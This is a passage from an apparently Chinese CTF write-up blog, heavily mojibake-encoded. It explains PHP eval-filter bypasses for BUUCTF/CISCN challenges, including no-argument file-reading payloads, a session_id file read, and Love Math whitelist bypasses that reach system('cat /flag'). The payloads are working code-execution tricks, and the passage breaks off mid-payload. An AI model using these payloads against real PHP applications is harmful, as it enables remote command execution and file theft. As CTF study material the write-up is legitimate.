operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä»£ç å®¡è®¡åˆ†æï¼š"><a href="#ä»£ç å®¡è®¡åˆ†æï¼š" class="headerlink" title="ä»£ç å®¡è®¡åˆ†æï¼š"></a>ä»£ç å®¡è®¡åˆ†æï¼š</h3><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼šåŒ¹é…äº†æ‰€æœ‰çš„æ–‡ä»¶è¯»å–</p><p>ç¬¬äºŒä¸ªåˆ¤æ–­ï¼šæ­¤å¤„åŒ¹é…ä¸ºé€’å½’æ›¿æ¢ï¼Œå°†æ‰€æœ‰çš„æ ¼å¼ä¸ºå‡½æ•°ç©ºå‚æ•°çš„æ›¿æ¢ä¸ºnullï¼Œç„¶ååˆ¤æ–­æœ€åæ˜¯å¦ä¸ºåˆ†å·</p><p>ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼šåŒ¹é…äº†éƒ¨åˆ†å…³é”®å‡½æ•°çš„å…³é”®è¯</p><p>ä»¥ä¸Šä¸‰ä¸ªæ¡ä»¶éƒ½æ»¡è¶³çš„è¯ï¼Œä¼šæ˜¯æ‰§è¡Œevalå‡½æ•°äº†</p><h3 id="æ‰«ç›²ï¼š"><a href="#æ‰«ç›²ï¼š" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h3><p><a href="https://www.runoob.com/php/func-array-current.html" target="_blank" rel="noopener">PHP current() å‡½æ•°</a>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼Œä¸è¿‡è¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆä¸pos()å‡½æ•°ç”¨æ³•ä¸€è‡´ã€‚</p><p><a href="https://www.runoob.com/php/func-string-localeconv.html" target="_blank" rel="noopener">PHP localeconv() å‡½æ•°</a>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚åœ¨æ­¤é¢˜ä¸­åˆ©ç”¨çš„æ˜¯ä»–çš„ç¬¬ä¸€ä¸ªvalue=â€™.â€™ï¼Œåˆ©ç”¨current()å‡½æ•°ä¸å…¶ç»“åˆå°±èƒ½å®ç°è¿”å›å€¼ä¸ºä¸€ä¸ªç‚¹</p><p><a href="https://www.runoob.com/php/func-directory-scandir.html" target="_blank" rel="noopener">PHP scandir() å‡½æ•°</a>ï¼šç´¯å‡ºç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ï¼Œå°±æƒ³æ˜¯åœ¨linuxç³»ç»Ÿä¸‹çš„ls -al</p><p><a href="https://www.runoob.com/php/php-print_r-function.html" target="_blank" rel="noopener">PHP print_r() å‡½æ•°</a>ï¼šç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤ºã€‚</p><p>åˆ©ç”¨ä»¥ä¸Šè¿™ä¸‰ä¸ªå‡½æ•°å°±å¯ä»¥å®ç°æ‰“å°å‡ºç›®å½•ä¸­çš„æ–‡ä»¶æˆ–ç›®å½•ï¼š</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><h3 id="å§¿åŠ¿å±•ç¤º-å¯ä»¥åˆ©ç”¨ä»¥ä¸‹payloadæ¥æœ¬åœ°è¯•éªŒ-ï¼š"><a href="#å§¿åŠ¿å±•ç¤º-å¯ä»¥åˆ©ç”¨ä»¥ä¸‹payloadæ¥æœ¬åœ°è¯•éªŒ-ï¼š" class="headerlink" title="å§¿åŠ¿å±•ç¤º(å¯ä»¥åˆ©ç”¨ä»¥ä¸‹payloadæ¥æœ¬åœ°è¯•éªŒ)ï¼š"></a>å§¿åŠ¿å±•ç¤º(å¯ä»¥åˆ©ç”¨ä»¥ä¸‹payloadæ¥æœ¬åœ°è¯•éªŒ)ï¼š</h3><h4 id="å§¿åŠ¿ä¸€ï¼š"><a href="#å§¿åŠ¿ä¸€ï¼š" class="headerlink" title="å§¿åŠ¿ä¸€ï¼š"></a>å§¿åŠ¿ä¸€ï¼š</h4><p><a href="https://www.runoob.com/php/func-array-rand.html" target="_blank" rel="noopener">PHP array_rand() å‡½æ•°</a>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«éšæœºé”®åçš„æ•°ç»„</p><p><a href="https://www.runoob.com/php/func-array-flip.html" target="_blank" rel="noopener">PHP array_flip() å‡½æ•°</a>ï¼šåè½¬æ•°ç»„ä¸­çš„é”®åå’Œå¯¹åº”å…³è”çš„é”®å€¼</p><p>æ­¤å¤„å¦‚æœæ²¡æœ‰flipå‡½æ•°çš„è¯ï¼Œè¿”å›å€¼åªèƒ½æ˜¯å¥å€¼</p><p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p><h4 id="å§¿åŠ¿äºŒï¼š"><a href="#å§¿åŠ¿äºŒï¼š" class="headerlink" title="å§¿åŠ¿äºŒï¼š"></a>å§¿åŠ¿äºŒï¼š</h4><p><a href="https://www.runoob.com/php/func-array-reverse.html" target="_blank" rel="noopener">PHP array_reverse() å‡½æ•°</a>ï¼šä»¥ç›¸åçš„é¡ºåºè¿”å›æ•°ç»„</p><p><a href="https://www.runoob.com/php/func-array-next.html" target="_blank" rel="noopener">PHP next() å‡½æ•°</a>ï¼šå°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡ç€æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¾“å‡ºä¸current()å‡½æ•°ç»“åˆä½¿ç”¨</p><p><a href="https://www.runoob.com/php/func-filesystem-readfile.html" target="_blank" rel="noopener">PHP readfile() å‡½æ•°</a>ï¼šå‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚å¦‚æœå¤±è´¥ï¼Œè¯¥å‡½æ•°è¿”å› FALSE å¹¶é™„å¸¦é”™è¯¯ä¿¡æ¯ã€‚</p><p><code>?exp=readfile(next(array_reverse(scandir(current(localeconv())))));</code></p><h4 id="å§¿åŠ¿ä¸‰ï¼š"><a href="#å§¿åŠ¿ä¸‰ï¼š" class="headerlink" title="å§¿åŠ¿ä¸‰ï¼š"></a>å§¿åŠ¿ä¸‰ï¼š</h4><p>åˆ©ç”¨ä¼šè¯ä¸­çš„å†…å®¹æ¥å®ç°å®šä½è¯»å–(è¿™é‡Œå‰ææ˜¯å·²ç»çŸ¥é“äº†æ–‡ä»¶å)</p><p>session_id():å¯ä»¥è·å–åˆ°å½“å‰çš„ä¼šè¯ID.</p><p>session_start():ä¼šåˆ›å»ºæ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ã€‚å¦‚æœé€šè¿‡ GET æˆ–è€… POST æ–¹å¼,æˆ–è€…ä½¿ç”¨ cookie æäº¤äº†ä¼šè¯ IDï¼Œ åˆ™ä¼šé‡ç”¨ç°æœ‰ä¼šè¯ã€‚</p><p>å› ä¸ºSessionIDæ˜¯å­˜æ”¾åœ¨å®¢æˆ·ç«¯çš„cookieä¸­çš„,æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨è®¾ç½®ä¼šè¯IDä¸ºflag.phpæ¥è¯»å–åˆ°å…¶ä¸­çš„å†…å®¹ï¼Œä¼šè¯idéœ€è¦ä¸º=PHPSESSID</p><p><code>?exp=readfile(session_id(session_start()));</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8802%E6%97%A51416_2.png" alt></p><h3 id="æŠ€æœ¯æ”¯æŒï¼š"><a href="#æŠ€æœ¯æ”¯æŒï¼š" class="headerlink" title="æŠ€æœ¯æ”¯æŒï¼š"></a>æŠ€æœ¯æ”¯æŒï¼š</h3><p><a href="https://www.cnblogs.com/wangtanzhi/p/12311239.html" target="_blank" rel="noopener">ç‹å¹ä¹‹</a></p><h1 id="2021-06-02"><a href="#2021-06-02" class="headerlink" title="2021-06-02"></a>2021-06-02</h1><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>é¢˜ç›®ä¸ºç½‘ç›˜ä¸»é¢˜çš„cms</p><h3 id="ä¿¡æ¯æ”¶é›†é˜¶æ®µï¼š"><a href="#ä¿¡æ¯æ”¶é›†é˜¶æ®µï¼š" class="headerlink" title="ä¿¡æ¯æ”¶é›†é˜¶æ®µï¼š"></a>ä¿¡æ¯æ”¶é›†é˜¶æ®µï¼š</h3><p>ç½‘ç«™å«æœ‰ä¸Šä¼ ã€ä¸‹è½½ã€ç™»é™†ã€æ³¨å†Œã€åˆ é™¤åŠŸèƒ½</p><p>åŒæ—¶åœ¨ä¸‹è½½å¤„å­˜åœ¨ç›®å½•ç©¿è¶Š    ä¸‹è½½æ¼æ´ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8802%E6%97%A51640_1.png" alt></p><p>å¯ä»¥æ ¹æ®downä¸‹æ¥çš„ä¸€äº›phpæ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œå’Œ</p><h1 id="2021-06-03"><a href="#2021-06-03" class="headerlink" title="2021-06-03"></a>2021-06-03</h1><p>CS:GO</p><h1 id="2021-06-04"><a href="#2021-06-04" class="headerlink" title="2021-06-04"></a>2021-06-04</h1><p>CS:GO</p><h1 id="2021-06-05"><a href="#2021-06-05" class="headerlink" title="2021-06-05"></a>2021-06-05</h1><p>ä¸Šåˆ+ä¸‹åˆCS:GO</p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><h3 id="æ‰«ç›²ï¼š-1"><a href="#æ‰«ç›²ï¼š-1" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h3><p>1.<a href="https://www.runoob.com/php/php-preg_match_all.html" target="_blank" rel="noopener">preg_match_all()å‡½æ•°</a>ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token string">"Name: &lt;b>PHP&lt;/b> &lt;br> Title: &lt;b>Programming Language&lt;/b>"</span><span class="token punctuation">;</span><span class="token function">preg_match_all</span> <span class="token punctuation">(</span><span class="token string">"/&lt;b>(.*)&lt;\/b>/U"</span><span class="token punctuation">,</span> <span class="token variable">$userinfo</span><span class="token punctuation">,</span> <span class="token variable">$pat_array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$pat_array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ç¬¬äºŒä¸ªå‚æ•°ä¸ºåŒ¹é…å¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶åå°†ç»“æœä»¥æ•°ç»„çš„å½¢å¼å‚¨å­˜åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°å½“ä¸­</p><p>2.<code>/m</code>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ä½œç”¨ä¸ºï¼šå°†æ¨¡å¼è§†ä¸ºå¤šè¡Œï¼Œä½¿ç”¨^å’Œ$è¡¨ç¤ºä»»ä½•ä¸€è¡Œéƒ½å¯ä»¥ä»¥æ­£åˆ™è¡¨è¾¾å¼å¼€å§‹æˆ–ç»“æŸ</p><p>3.<a href="https://www.runoob.com/php/func-array-in-array.html" target="_blank" rel="noopener">in_array()</a>ï¼šåˆ¤æ–­æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼</p><p>4.<a href="https://www.runoob.com/php/func-math-base-convert.html" target="_blank" rel="noopener">PHP base_convert() å‡½æ•°</a>ï¼šå‡½æ•°åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span>æŠŠå…«è¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ï¼š<span class="token delimiter">&lt;?php</span><span class="token variable">$oct</span> <span class="token operator">=</span> <span class="token string">"364"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$oct</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.</p><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//ä¾‹å­ c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$blacklisté»‘åå•è¿‡æ»¤å‡½æ•°</p><p>$whitelistç™½åå•é™åˆ¶å‡½æ•°</p><p>ç™½åå•ä¸­æåˆ°çš„å‡ ä¸ªå‡½æ•°ï¼š</p><p>base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚<br>dechex() å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚<br>hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p><p>è¿™ä¸‰ä¸ªå‡½æ•°çš„ç»“åˆå°±å¯ä»¥å®ç°ä»»æ„å­—ç¬¦çš„è½¬æ¢</p><h3 id="è§£æ³•ä¸€ï¼š"><a href="#è§£æ³•ä¸€ï¼š" class="headerlink" title="è§£æ³•ä¸€ï¼š"></a>è§£æ³•ä¸€ï¼š</h3><p>æˆ‘ä»¬éœ€è¦çš„payload</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>system<span class="token operator">&amp;</span>b<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>system<span class="token operator">&amp;</span>b<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span>cat <span class="token operator">/</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ç™½åå•ä¸å­˜åœ¨hex2binå‡½æ•°ï¼Œå°±è¦è€ƒè™‘ä¸€ä¸‹å…¶ç»•è¿‡å§¿åŠ¿ï¼š</p><p><a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">è¿›åˆ¶è½¬æ¢ç½‘ç«™</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">=</span>hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>hex2bin()çš„ç›®çš„æ˜¯å› ä¸º_GETä¸­æœ‰ä¸‹åˆ’çº¿çš„å­˜åœ¨æ‰€ä»¥å¿…é¡»è¿›è¡ŒASCIIçš„è½¬æ¢ï¼šåè¿›åˆ¶è½¬æ¢16è¿›åˆ¶å†è½¬æ¢ASCIIç </p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token shell-comment comment">#10è½¬16</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token shell-comment comment">#16è½¬ASCII</span><span class="token function">hex2bin</span><span class="token punctuation">(</span>5f474554<span class="token punctuation">)</span><span class="token operator">=</span><span class="token constant">_GET</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æ€»çš„åµŒå¥—å°±æ˜¯ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token constant">_GET</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ©ç”¨å˜é‡è¦†ç›–çš„å§¿åŠ¿å®ç°ç»•è¿‡ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$y</span><span class="token operator">=</span><span class="token constant">_GET</span><span class="token punctuation">;</span>$<span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">;</span>$<span class="token variable">$y</span><span class="token punctuation">{</span>a<span class="token punctuation">}</span><span class="token punctuation">(</span>$<span class="token variable">$y</span><span class="token punctuation">{</span>b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">{</span>a<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span>b<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#å› ä¸ºä¸­æ‹¬å·è¢«è¿‡æ»¤äº†æ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨èŠ±æ‹¬å·æ¥å®ç°ç»•è¿‡</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$log</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token 